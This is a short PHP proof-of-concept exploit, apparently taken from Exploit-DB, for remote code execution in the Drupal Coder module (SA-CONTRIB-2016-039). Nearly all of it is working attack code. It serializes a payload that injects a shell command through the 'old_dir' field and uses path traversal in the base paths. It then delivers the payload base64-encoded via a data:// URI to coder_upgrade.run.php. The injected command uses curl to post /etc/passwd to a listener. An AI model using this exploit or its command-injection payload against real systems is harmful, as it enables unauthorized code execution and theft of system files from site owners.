<?php

# Drupal module Coder Remote Code Execution (SA-CONTRIB-2016-039)
# https://www.drupal.org/node/2765575
# by Raz0r (http://raz0r.name)
#
# E-DB Note: Source ~ https://gist.github.com/Raz0r/7b7501cb53db70e7d60819f8eb9fcef5

$cmd = "curl -XPOST http://localhost:4444 -d @/etc/passwd";
$host = "http://localhost:81/drupal-7.12/";

$a = array(
    "upgrades" => array(
        "coder_upgrade" => array(
            "module" => "color",
            "files" => array("color.module")
        )
    ),
    "extensions" => array("module"),
    "items" => array (array("old_dir"=>"test; $cmd;", "new_dir"=>"test")),
    "paths" => array(
        "modules_base" => "../../../",
        "files_base" => "../../../../sites/default/files"
    )
);
$payload = serialize($a);
file_get_contents($host . "/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?file=data://text/plain;base64," . base64_encode($payload));

?>